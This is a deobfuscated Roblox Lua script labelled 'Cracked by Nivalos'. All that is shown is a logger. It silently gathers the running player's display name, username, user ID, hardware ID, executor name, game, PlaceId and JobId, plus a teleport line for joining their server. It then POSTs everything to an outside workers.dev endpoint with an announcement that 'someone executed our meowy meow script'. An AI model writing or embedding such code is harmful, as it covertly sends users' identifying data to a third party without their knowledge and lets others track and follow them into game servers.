-- Cracked by Nivalos
repeat
    task.wait()
until game:IsLoaded()
local v1 = game:GetService("Players")
local vu2 = game:GetService("HttpService")
local vu3 = game:GetService("MarketplaceService")
local v4 = v1.LocalPlayer
local v5 = v4.DisplayName
local v6 = v4.Name
local v7 = v4.UserId
local _ = v4.AccountAge
local vu8 = game.PlaceId
local v9 = game.JobId
local vu10 = "Unknown"
pcall(function()
    local v11 = vu3:GetProductInfo(vu8)
    if v11 then
        vu10 = v11.Name
    end
end)
local v12 = gethwid and gethwid() or "unknown"
local v13 = identifyexecutor and identifyexecutor() or "Unknown"
local v14 = os.date("%Y-%m-%d %H:%M:%S")
local vu15 = {
    message = table.concat({
        "(\239\188\158\226\128\148\239\188\156) someone executed our meowy meow script!",
        "**Player:** ``" .. v5 .. "`` (``" .. v6 .. "``) | Uid: ``" .. v7 .. "``",
        "**Game:** ``" .. vu10 .. "`` | PlaceId: ``" .. vu8 .. "`` | JobId: ``" .. v9 .. "``",
        "**Other:** Hwid: ``" .. v12 .. "`` | Executor: " .. v13 .. " | Time: " .. v14,
        "**Join Code:** ``game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. vu8 .. ", \"" .. v9 .. "\", game.Players.LocalPlayer)``"
    }, "\n"),
    key = jaquavis6769
}
pcall(function()
    local v16 = vu2
    local v17 = v16.RequestAsync
    local v18 = {
        Url = "https://lumina1.egesdabest.workers.dev/",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = vu2:JSONEncode(vu15)
    }
    v17(v16, v18)
end)